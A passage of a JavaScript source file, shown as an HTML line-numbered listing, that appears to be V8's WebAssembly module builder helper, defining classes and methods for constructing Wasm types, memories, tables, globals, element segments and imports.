&gt; names.length) this.local_names.push(count - names.length);</td></tr><tr><td class="line-number" value="1273"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1274"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1275"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1276"></td><td class="line-content">  end() {</td></tr><tr><td class="line-number" value="1277"></td><td class="line-content">    return this.module;</td></tr><tr><td class="line-number" value="1278"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1279"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1280"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1281"></td><td class="line-content">  class WasmGlobalBuilder {</td></tr><tr><td class="line-number" value="1282"></td><td class="line-content">  constructor(module, type, mutable, shared, init) {</td></tr><tr><td class="line-number" value="1283"></td><td class="line-content">    this.module = module;</td></tr><tr><td class="line-number" value="1284"></td><td class="line-content">    this.type = type;</td></tr><tr><td class="line-number" value="1285"></td><td class="line-content">    this.mutable = mutable;</td></tr><tr><td class="line-number" value="1286"></td><td class="line-content">    this.shared = shared;</td></tr><tr><td class="line-number" value="1287"></td><td class="line-content">    this.init = init;</td></tr><tr><td class="line-number" value="1288"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1289"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1290"></td><td class="line-content">  exportAs(name) {</td></tr><tr><td class="line-number" value="1291"></td><td class="line-content">    this.module.exports.push(</td></tr><tr><td class="line-number" value="1292"></td><td class="line-content">        {name: name, kind: kExternalGlobal, index: this.index});</td></tr><tr><td class="line-number" value="1293"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1294"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1295"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1296"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1297"></td><td class="line-content">  function checkExpr(expr) {</td></tr><tr><td class="line-number" value="1298"></td><td class="line-content">  for (let b of expr) {</td></tr><tr><td class="line-number" value="1299"></td><td class="line-content">    if (typeof b !== 'number' || (b &amp; (~0xFF)) !== 0) {</td></tr><tr><td class="line-number" value="1300"></td><td class="line-content">      throw new Error(</td></tr><tr><td class="line-number" value="1301"></td><td class="line-content">          'invalid body (entries must be 8 bit numbers): ' + expr);</td></tr><tr><td class="line-number" value="1302"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1303"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1304"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1305"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1306"></td><td class="line-content">  class WasmTableBuilder {</td></tr><tr><td class="line-number" value="1307"></td><td class="line-content">  constructor(module, type, initial_size, max_size, init_expr) {</td></tr><tr><td class="line-number" value="1308"></td><td class="line-content">    // TODO(manoskouk): Add the table index.</td></tr><tr><td class="line-number" value="1309"></td><td class="line-content">    this.module = module;</td></tr><tr><td class="line-number" value="1310"></td><td class="line-content">    this.type = type;</td></tr><tr><td class="line-number" value="1311"></td><td class="line-content">    this.initial_size = initial_size;</td></tr><tr><td class="line-number" value="1312"></td><td class="line-content">    this.has_max = max_size !== undefined;</td></tr><tr><td class="line-number" value="1313"></td><td class="line-content">    this.max_size = max_size;</td></tr><tr><td class="line-number" value="1314"></td><td class="line-content">    this.init_expr = init_expr;</td></tr><tr><td class="line-number" value="1315"></td><td class="line-content">    this.has_init = init_expr !== undefined;</td></tr><tr><td class="line-number" value="1316"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1317"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1318"></td><td class="line-content">  exportAs(name) {</td></tr><tr><td class="line-number" value="1319"></td><td class="line-content">    this.module.exports.push(</td></tr><tr><td class="line-number" value="1320"></td><td class="line-content">        {name: name, kind: kExternalTable, index: this.index});</td></tr><tr><td class="line-number" value="1321"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1322"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1323"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1324"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1325"></td><td class="line-content">  function makeField(type, mutability) {</td></tr><tr><td class="line-number" value="1326"></td><td class="line-content">  if ((typeof mutability) != 'boolean') {</td></tr><tr><td class="line-number" value="1327"></td><td class="line-content">    throw new Error('field mutability must be boolean');</td></tr><tr><td class="line-number" value="1328"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1329"></td><td class="line-content">  return {type: type, mutability: mutability};</td></tr><tr><td class="line-number" value="1330"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1331"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1332"></td><td class="line-content">  class WasmStruct {</td></tr><tr><td class="line-number" value="1333"></td><td class="line-content">  constructor(fields, is_final, is_shared, supertype_idx) {</td></tr><tr><td class="line-number" value="1334"></td><td class="line-content">    if (!Array.isArray(fields)) {</td></tr><tr><td class="line-number" value="1335"></td><td class="line-content">      throw new Error('struct fields must be an array');</td></tr><tr><td class="line-number" value="1336"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1337"></td><td class="line-content">    this.fields = fields;</td></tr><tr><td class="line-number" value="1338"></td><td class="line-content">    this.type_form = kWasmStructTypeForm;</td></tr><tr><td class="line-number" value="1339"></td><td class="line-content">    this.is_final = is_final;</td></tr><tr><td class="line-number" value="1340"></td><td class="line-content">    this.is_shared = is_shared;</td></tr><tr><td class="line-number" value="1341"></td><td class="line-content">    this.supertype = supertype_idx;</td></tr><tr><td class="line-number" value="1342"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1343"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1344"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1345"></td><td class="line-content">  class WasmArray {</td></tr><tr><td class="line-number" value="1346"></td><td class="line-content">  constructor(type, mutability, is_final, is_shared, supertype_idx) {</td></tr><tr><td class="line-number" value="1347"></td><td class="line-content">    this.type = type;</td></tr><tr><td class="line-number" value="1348"></td><td class="line-content">    this.mutability = mutability;</td></tr><tr><td class="line-number" value="1349"></td><td class="line-content">    this.type_form = kWasmArrayTypeForm;</td></tr><tr><td class="line-number" value="1350"></td><td class="line-content">    this.is_final = is_final;</td></tr><tr><td class="line-number" value="1351"></td><td class="line-content">    this.is_shared = is_shared;</td></tr><tr><td class="line-number" value="1352"></td><td class="line-content">    this.supertype = supertype_idx;</td></tr><tr><td class="line-number" value="1353"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1354"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1355"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1356"></td><td class="line-content">  class WasmElemSegment {</td></tr><tr><td class="line-number" value="1357"></td><td class="line-content">  constructor(table, offset, type, elements, is_decl) {</td></tr><tr><td class="line-number" value="1358"></td><td class="line-content">    this.table = table;</td></tr><tr><td class="line-number" value="1359"></td><td class="line-content">    this.offset = offset;</td></tr><tr><td class="line-number" value="1360"></td><td class="line-content">    this.type = type;</td></tr><tr><td class="line-number" value="1361"></td><td class="line-content">    this.elements = elements;</td></tr><tr><td class="line-number" value="1362"></td><td class="line-content">    this.is_decl = is_decl;</td></tr><tr><td class="line-number" value="1363"></td><td class="line-content">    // Invariant checks.</td></tr><tr><td class="line-number" value="1364"></td><td class="line-content">    if ((table === undefined) != (offset === undefined)) {</td></tr><tr><td class="line-number" value="1365"></td><td class="line-content">      throw new Error("invalid element segment");</td></tr><tr><td class="line-number" value="1366"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1367"></td><td class="line-content">    for (let elem of elements) {</td></tr><tr><td class="line-number" value="1368"></td><td class="line-content">      if (((typeof elem) == 'number') != (type === undefined)) {</td></tr><tr><td class="line-number" value="1369"></td><td class="line-content">        throw new Error("invalid element");</td></tr><tr><td class="line-number" value="1370"></td><td class="line-content">      }</td></tr><tr><td class="line-number" value="1371"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1372"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1373"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1374"></td><td class="line-content">  is_active() {</td></tr><tr><td class="line-number" value="1375"></td><td class="line-content">    return this.table !== undefined;</td></tr><tr><td class="line-number" value="1376"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1377"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1378"></td><td class="line-content">  is_passive() {</td></tr><tr><td class="line-number" value="1379"></td><td class="line-content">    return this.table === undefined &amp;&amp; !this.is_decl;</td></tr><tr><td class="line-number" value="1380"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1381"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1382"></td><td class="line-content">  is_declarative() {</td></tr><tr><td class="line-number" value="1383"></td><td class="line-content">    return this.table === undefined &amp;&amp; this.is_decl;</td></tr><tr><td class="line-number" value="1384"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1385"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1386"></td><td class="line-content">  expressions_as_elements() {</td></tr><tr><td class="line-number" value="1387"></td><td class="line-content">    return this.type !== undefined;</td></tr><tr><td class="line-number" value="1388"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1389"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1390"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1391"></td><td class="line-content">  class WasmModuleBuilder {</td></tr><tr><td class="line-number" value="1392"></td><td class="line-content">  constructor() {</td></tr><tr><td class="line-number" value="1393"></td><td class="line-content">    this.types = [];</td></tr><tr><td class="line-number" value="1394"></td><td class="line-content">    this.imports = [];</td></tr><tr><td class="line-number" value="1395"></td><td class="line-content">    this.exports = [];</td></tr><tr><td class="line-number" value="1396"></td><td class="line-content">    this.stringrefs = [];</td></tr><tr><td class="line-number" value="1397"></td><td class="line-content">    this.globals = [];</td></tr><tr><td class="line-number" value="1398"></td><td class="line-content">    this.tables = [];</td></tr><tr><td class="line-number" value="1399"></td><td class="line-content">    this.tags = [];</td></tr><tr><td class="line-number" value="1400"></td><td class="line-content">    this.memories = [];</td></tr><tr><td class="line-number" value="1401"></td><td class="line-content">    this.functions = [];</td></tr><tr><td class="line-number" value="1402"></td><td class="line-content">    this.compilation_hints = [];</td></tr><tr><td class="line-number" value="1403"></td><td class="line-content">    this.element_segments = [];</td></tr><tr><td class="line-number" value="1404"></td><td class="line-content">    this.data_segments = [];</td></tr><tr><td class="line-number" value="1405"></td><td class="line-content">    this.explicit = [];</td></tr><tr><td class="line-number" value="1406"></td><td class="line-content">    this.rec_groups = [];</td></tr><tr><td class="line-number" value="1407"></td><td class="line-content">    this.num_imported_funcs = 0;</td></tr><tr><td class="line-number" value="1408"></td><td class="line-content">    this.num_imported_globals = 0;</td></tr><tr><td class="line-number" value="1409"></td><td class="line-content">    this.num_imported_tables = 0;</td></tr><tr><td class="line-number" value="1410"></td><td class="line-content">    this.num_imported_tags = 0;</td></tr><tr><td class="line-number" value="1411"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1412"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1413"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1414"></td><td class="line-content">  addStart(start_index) {</td></tr><tr><td class="line-number" value="1415"></td><td class="line-content">    this.start_index = start_index;</td></tr><tr><td class="line-number" value="1416"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1417"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1418"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1419"></td><td class="line-content">  addMemory(min, max, shared) {</td></tr><tr><td class="line-number" value="1420"></td><td class="line-content">    // Note: All imported memories are added before declared ones (see the check</td></tr><tr><td class="line-number" value="1421"></td><td class="line-content">    // in {addImportedMemory}).</td></tr><tr><td class="line-number" value="1422"></td><td class="line-content">    const imported_memories =</td></tr><tr><td class="line-number" value="1423"></td><td class="line-content">        this.imports.filter(i =&gt; i.kind == kExternalMemory).length;</td></tr><tr><td class="line-number" value="1424"></td><td class="line-content">    const mem_index = imported_memories + this.memories.length;</td></tr><tr><td class="line-number" value="1425"></td><td class="line-content">    this.memories.push(</td></tr><tr><td class="line-number" value="1426"></td><td class="line-content">        {min: min, max: max, shared: shared || false, is_memory64: false});</td></tr><tr><td class="line-number" value="1427"></td><td class="line-content">    return mem_index;</td></tr><tr><td class="line-number" value="1428"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1429"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1430"></td><td class="line-content">  addMemory64(min, max, shared) {</td></tr><tr><td class="line-number" value="1431"></td><td class="line-content">    // Note: All imported memories are added before declared ones (see the check</td></tr><tr><td class="line-number" value="1432"></td><td class="line-content">    // in {addImportedMemory}).</td></tr><tr><td class="line-number" value="1433"></td><td class="line-content">    const imported_memories =</td></tr><tr><td class="line-number" value="1434"></td><td class="line-content">        this.imports.filter(i =&gt; i.kind == kExternalMemory).length;</td></tr><tr><td class="line-number" value="1435"></td><td class="line-content">    const mem_index = imported_memories + this.memories.length;</td></tr><tr><td class="line-number" value="1436"></td><td class="line-content">    this.memories.push(</td></tr><tr><td class="line-number" value="1437"></td><td class="line-content">        {min: min, max: max, shared: shared || false, is_memory64: true});</td></tr><tr><td class="line-number" value="1438"></td><td class="line-content">    return mem_index;</td></tr><tr><td class="line-number" value="1439"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1440"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1441"></td><td class="line-content">  addExplicitSection(bytes) {</td></tr><tr><td class="line-number" value="1442"></td><td class="line-content">    this.explicit.push(bytes);</td></tr><tr><td class="line-number" value="1443"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1444"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1445"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1446"></td><td class="line-content">  stringToBytes(name) {</td></tr><tr><td class="line-number" value="1447"></td><td class="line-content">    var result = new Binary();</td></tr><tr><td class="line-number" value="1448"></td><td class="line-content">    result.emit_u32v(name.length);</td></tr><tr><td class="line-number" value="1449"></td><td class="line-content">    for (var i = 0; i &lt; name.length; i++) {</td></tr><tr><td class="line-number" value="1450"></td><td class="line-content">      result.emit_u8(name.charCodeAt(i));</td></tr><tr><td class="line-number" value="1451"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1452"></td><td class="line-content">    return result.trunc_buffer()</td></tr><tr><td class="line-number" value="1453"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1454"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1455"></td><td class="line-content">  createCustomSection(name, bytes) {</td></tr><tr><td class="line-number" value="1456"></td><td class="line-content">    name = this.stringToBytes(name);</td></tr><tr><td class="line-number" value="1457"></td><td class="line-content">    var section = new Binary();</td></tr><tr><td class="line-number" value="1458"></td><td class="line-content">    section.emit_u8(0);</td></tr><tr><td class="line-number" value="1459"></td><td class="line-content">    section.emit_u32v(name.length + bytes.length);</td></tr><tr><td class="line-number" value="1460"></td><td class="line-content">    section.emit_bytes(name);</td></tr><tr><td class="line-number" value="1461"></td><td class="line-content">    section.emit_bytes(bytes);</td></tr><tr><td class="line-number" value="1462"></td><td class="line-content">    return section.trunc_buffer();</td></tr><tr><td class="line-number" value="1463"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1464"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1465"></td><td class="line-content">  addCustomSection(name, bytes) {</td></tr><tr><td class="line-number" value="1466"></td><td class="line-content">    this.explicit.push(this.createCustomSection(name, bytes));</td></tr><tr><td class="line-number" value="1467"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1468"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1469"></td><td class="line-content">  // We use {is_final = true} so that the MVP syntax is generated for</td></tr><tr><td class="line-number" value="1470"></td><td class="line-content">  // signatures.</td></tr><tr><td class="line-number" value="1471"></td><td class="line-content">  addType(type, supertype_idx = kNoSuperType, is_final = true, is_shared = false) {</td></tr><tr><td class="line-number" value="1472"></td><td class="line-content">    var pl = type.params.length;   // should have params</td></tr><tr><td class="line-number" value="1473"></td><td class="line-content">    var rl = type.results.length;  // should have results</td></tr><tr><td class="line-number" value="1474"></td><td class="line-content">    var type_copy = {params: type.params, results: type.results,</td></tr><tr><td class="line-number" value="1475"></td><td class="line-content">                     is_final: is_final, is_shared: is_shared, supertype: supertype_idx};</td></tr><tr><td class="line-number" value="1476"></td><td class="line-content">    this.types.push(type_copy);</td></tr><tr><td class="line-number" value="1477"></td><td class="line-content">    return this.types.length - 1;</td></tr><tr><td class="line-number" value="1478"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1479"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1480"></td><td class="line-content">  addLiteralStringRef(str) {</td></tr><tr><td class="line-number" value="1481"></td><td class="line-content">    this.stringrefs.push(str);</td></tr><tr><td class="line-number" value="1482"></td><td class="line-content">    return this.stringrefs.length - 1;</td></tr><tr><td class="line-number" value="1483"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1484"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1485"></td><td class="line-content">  addStruct(fields, supertype_idx = kNoSuperType, is_final = false, is_shared = false) {</td></tr><tr><td class="line-number" value="1486"></td><td class="line-content">    this.types.push(new WasmStruct(fields, is_final, is_shared, supertype_idx));</td></tr><tr><td class="line-number" value="1487"></td><td class="line-content">    return this.types.length - 1;</td></tr><tr><td class="line-number" value="1488"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1489"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1490"></td><td class="line-content">  addArray(type, mutability, supertype_idx = kNoSuperType, is_final = false, is_shared = false) {</td></tr><tr><td class="line-number" value="1491"></td><td class="line-content">    this.types.push(new WasmArray(type, mutability, is_final, is_shared, supertype_idx));</td></tr><tr><td class="line-number" value="1492"></td><td class="line-content">    return this.types.length - 1;</td></tr><tr><td class="line-number" value="1493"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1494"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1495"></td><td class="line-content">  static defaultFor(type) {</td></tr><tr><td class="line-number" value="1496"></td><td class="line-content">    switch (type) {</td></tr><tr><td class="line-number" value="1497"></td><td class="line-content">      case kWasmI32:</td></tr><tr><td class="line-number" value="1498"></td><td class="line-content">        return wasmI32Const(0);</td></tr><tr><td class="line-number" value="1499"></td><td class="line-content">      case kWasmI64:</td></tr><tr><td class="line-number" value="1500"></td><td class="line-content">        return wasmI64Const(0);</td></tr><tr><td class="line-number" value="1501"></td><td class="line-content">      case kWasmF32:</td></tr><tr><td class="line-number" value="1502"></td><td class="line-content">        return wasmF32Const(0.0);</td></tr><tr><td class="line-number" value="1503"></td><td class="line-content">      case kWasmF64:</td></tr><tr><td class="line-number" value="1504"></td><td class="line-content">        return wasmF64Const(0.0);</td></tr><tr><td class="line-number" value="1505"></td><td class="line-content">      case kWasmS128:</td></tr><tr><td class="line-number" value="1506"></td><td class="line-content">        return [kSimdPrefix, kExprS128Const, ...(new Array(16).fill(0))];</td></tr><tr><td class="line-number" value="1507"></td><td class="line-content">      default:</td></tr><tr><td class="line-number" value="1508"></td><td class="line-content">        if ((typeof type) != 'number' &amp;&amp; type.opcode != kWasmRefNull) {</td></tr><tr><td class="line-number" value="1509"></td><td class="line-content">          throw new Error("Non-defaultable type");</td></tr><tr><td class="line-number" value="1510"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="1511"></td><td class="line-content">        let heap_type = (typeof type) == 'number' ? type : type.heap_type;</td></tr><tr><td class="line-number" value="1512"></td><td class="line-content">        return [kExprRefNull, ...wasmSignedLeb(heap_type, kMaxVarInt32Size)];</td></tr><tr><td class="line-number" value="1513"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1514"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1515"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1516"></td><td class="line-content">  addGlobal(type, mutable, shared, init) {</td></tr><tr><td class="line-number" value="1517"></td><td class="line-content">    if (init === undefined) init = WasmModuleBuilder.defaultFor(type);</td></tr><tr><td class="line-number" value="1518"></td><td class="line-content">    checkExpr(init);</td></tr><tr><td class="line-number" value="1519"></td><td class="line-content">    let glob = new WasmGlobalBuilder(this, type, mutable, shared, init);</td></tr><tr><td class="line-number" value="1520"></td><td class="line-content">    glob.index = this.globals.length + this.num_imported_globals;</td></tr><tr><td class="line-number" value="1521"></td><td class="line-content">    this.globals.push(glob);</td></tr><tr><td class="line-number" value="1522"></td><td class="line-content">    return glob;</td></tr><tr><td class="line-number" value="1523"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1524"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1525"></td><td class="line-content">  addTable(</td></tr><tr><td class="line-number" value="1526"></td><td class="line-content">      type, initial_size, max_size = undefined, init_expr = undefined) {</td></tr><tr><td class="line-number" value="1527"></td><td class="line-content">    if (type == kWasmI32 || type == kWasmI64 || type == kWasmF32 ||</td></tr><tr><td class="line-number" value="1528"></td><td class="line-content">        type == kWasmF64 || type == kWasmS128 || type == kWasmVoid) {</td></tr><tr><td class="line-number" value="1529"></td><td class="line-content">      throw new Error('Tables must be of a reference type');</td></tr><tr><td class="line-number" value="1530"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1531"></td><td class="line-content">    if (init_expr != undefined) checkExpr(init_expr);</td></tr><tr><td class="line-number" value="1532"></td><td class="line-content">    let table = new WasmTableBuilder(</td></tr><tr><td class="line-number" value="1533"></td><td class="line-content">        this, type, initial_size, max_size, init_expr);</td></tr><tr><td class="line-number" value="1534"></td><td class="line-content">    table.index = this.tables.length + this.num_imported_tables;</td></tr><tr><td class="line-number" value="1535"></td><td class="line-content">    this.tables.push(table);</td></tr><tr><td class="line-number" value="1536"></td><td class="line-content">    return table;</td></tr><tr><td class="line-number" value="1537"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1538"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1539"></td><td class="line-content">  addTag(type) {</td></tr><tr><td class="line-number" value="1540"></td><td class="line-content">    let type_index = (typeof type) == 'number' ? type : this.addType(type);</td></tr><tr><td class="line-number" value="1541"></td><td class="line-content">    let tag_index = this.tags.length + this.num_imported_tags;</td></tr><tr><td class="line-number" value="1542"></td><td class="line-content">    this.tags.push(type_index);</td></tr><tr><td class="line-number" value="1543"></td><td class="line-content">    return tag_index;</td></tr><tr><td class="line-number" value="1544"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1545"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1546"></td><td class="line-content">  addFunction(name, type, arg_names) {</td></tr><tr><td class="line-number" value="1547"></td><td class="line-content">    arg_names = arg_names || [];</td></tr><tr><td class="line-number" value="1548"></td><td class="line-content">    let type_index = (typeof type) == 'number' ? type : this.addType(type);</td></tr><tr><td class="line-number" value="1549"></td><td class="line-content">    let num_args = this.types[type_index].params.length;</td></tr><tr><td class="line-number" value="1550"></td><td class="line-content">    if (num_args &lt; arg_names.length)</td></tr><tr><td class="line-number" value="1551"></td><td class="line-content">      throw new Error('too many arg names provided');</td></tr><tr><td class="line-number" value="1552"></td><td class="line-content">    if (num_args &gt; arg_names.length)</td></tr><tr><td class="line-number" value="1553"></td><td class="line-content">      arg_names.push(num_args - arg_names.length);</td></tr><tr><td class="line-number" value="1554"></td><td class="line-content">    let func = new WasmFunctionBuilder(this, name, type_index, arg_names);</td></tr><tr><td class="line-number" value="1555"></td><td class="line-content">    func.index = this.functions.length + this.num_imported_funcs;</td></tr><tr><td class="line-number" value="1556"></td><td class="line-content">    this.functions.push(func);</td></tr><tr><td class="line-number" value="1557"></td><td class="line-content">    return func;</td></tr><tr><td class="line-number" value="1558"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1559"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1560"></td><td class="line-content">  addImport(module, name, type) {</td></tr><tr><td class="line-number" value="1561"></td><td class="line-content">    if (this.functions.length != 0) {</td></tr><tr><td class="line-number" value="1562"></td><td class="line-content">      throw new Error('Imported functions must be declared before local ones');</td></tr><tr><td class="line-number" value="1563"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1564"></td><td class="line-content">    let type_index = (typeof type) == 'number' ? type : this.addType(type);</td></tr><tr><td class="line-number" value="1565"></td><td class="line-content">    this.imports.push({</td></tr><tr><td class="line-number" value="1566"></td><td class="line-content">      module: module,</td></tr><tr><td class="line-number" value="1567"></td><td class="line-content">      name: name,</td></tr><tr><td class="line-number" value="1568"></td><td class="line-content">      kind: kExternalFunction,</td></tr><tr><td class="line-number" value="1569"></td><td class="line-content">      type_index: type_index</td></tr><tr><td class="line-number" value="1570"></td><td class="line-content">    });</td></tr><tr><td class="line-number" value="1571"></td><td class="line-content">    return this.num_imported_funcs++;</td></tr><tr><td class="line-number" value="1572"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1573"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1574"></td><td class="line-content">  addImportedGlobal(module, name, type, mutable = false, shared = false) {</td></tr><tr><td class="line-number" value="1575"></td><td class="line-content">    if (this.globals.length != 0) {</td></tr><tr><td class="line-number" value="1576"></td><td class="line-content">      throw new Error('Imported globals must be declared before local ones');</td></tr><tr><td class="line-number" value="1577"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1578"></td><td class="line-content">    let o = {</td></tr><tr><td class="line-number" value="1579"></td><td class="line-content">      module: module,</td></tr><tr><td class="line-number" value="1580"></td><td class="line-content">      name: name,</td></tr><tr><td class="line-number" value="1581"></td><td class="line-content">      kind: kExternalGlobal,</td></tr><tr><td class="line-number" value="1582"></td><td class="line-content">      type: type,</td></tr><tr><td class="line-number" value="1583"></td><td class="line-content">      mutable: mutable,</td></tr><tr><td class="line-number" value="1584"></td><td class="line-content">      shared: shared</td></tr><tr><td class="line-number" value="1585"></td><td class="line-content">    };</td></tr><tr><td class="line-number" value="1586"></td><td class="line-content">    this.imports.push(o);</td></tr><tr><td class="line-number" value="1587"></td><td class="line-content">    return this.num_imported_globals++;</td></tr><tr><td class="line-number" value="1588"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1589"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1590"></td><td class="line-content">  addImportedMemory(module, name, initial = 0, maximum, shared, is_memory64) {</td></tr><tr><td class="line-number" value="1591"></td><td class="line-content">    if (this.memories.length !== 0) {</td></tr><tr><td class="line-number" value="1592"></td><td class="line-content">      throw new Error(</td></tr><tr><td class="line-number" value="1593"></td><td class="line-content">          'Add imported memories before declared memories to avoid messing ' +</td></tr><tr><td class="line-number" value="1594"></td><td class="line-content">          'up the indexes');</td></tr><tr><td class="line-number" value="1595"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1596"></td><td class="line-content">    let mem_index = this.imports.filter(i =&gt; i.kind == kExternalMemory).length;</td></tr><tr><td class="line-number" value="1597"></td><td class="line-content">    let o = {</td></tr><tr><td class="line-number" value="1598"></td><td class="line-content">      module: module,</td></tr><tr><td class="line-number" value="1599"></td><td class="line-content">      name: name,</td></tr><tr><td class="line-number" value="1600"></td><td class="line-content">      kind: kExternalMemory,</td></tr><tr><td class="line-number" value="1601"></td><td class="line-content">      initial: initial,</td></tr><tr><td class="line-number" value="1602"></td><td class="line-content">      maximum: maximum,</td></tr><tr><td class="line-number" value="1603"></td><td class="line-content">      shared: !!shared,</td></tr><tr><td class="line-number" value="1604"></td><td class="line-content">      is_memory64: !!is_memory64</td></tr><tr><td class="line-number" value="1605"></td><td class="line-content">    };</td></tr><tr><td class="line-number" value="1606"></td><td class="line-content">    this.imports.push(o);</td></tr><tr><td class="line-number" value="1607"></td><td class="line-content">    return mem_index;</td></tr><tr><td class="line-number" value="1608"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1609"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1610"></td><td class="line-content">  addImportedTable(module, name, initial, maximum, type) {</td></tr><tr><td class="line-number" value="1611"></td><td class="line-content">    if (this.tables.length != 0) {</td></tr><tr><td class="line-number" value="1612"></td><td class="line-content">      throw new Error('Imported tables must be declared before local ones');</td></tr><tr><td class="line-number" value="1613"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1614"></td><td class="line-content">    let o = {</td></tr><tr><td class="line-number" value="1615"></td><td class="line-content">      module: module,</td></tr><tr><td class="line-number" value="1616"></td><td class="line-content">      name: name,</td></tr><tr><td class="line-number" value="1617"></td><td class="line-content">      kind: kExternalTable,</td></tr><tr><td class="line-number" value="1618"></td><td class="line-content">      initial: initial,</td></tr><tr><td class="line-number" value="1619"></td><td class="line-content">      maximum: maximum,</td></tr><tr><td class="line-number" value="1620"></td><td class="line-content">      type: type || kWasmFuncRef</td></tr><tr><td class="line-number" value="1621"></td><td class="line-content">    };</td></tr><tr><td class="line-number" value="1622"></td><td class="line-content">    this.imports.push(o);</td></tr><tr><td class="line-number" value="1623"></td><td class="line-content">    return this.num_imported_tables++;</td></tr><tr><td class="line-number" value="1624"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1625"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1626"></td><td class="line-content">  addImportedTag(module, name, type) {</td></tr><tr><td class="line-number" value="1627"></td><td class="line-content">    if (this.tags.length != 0) {</td></tr><tr><td class="line-number" value="1628"></td><td class="line-content">      throw new Error('Imported tags must be declared before local ones');</td></tr><tr><td class="line-number" value="1629"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1630"></td><td class="line-content">    let 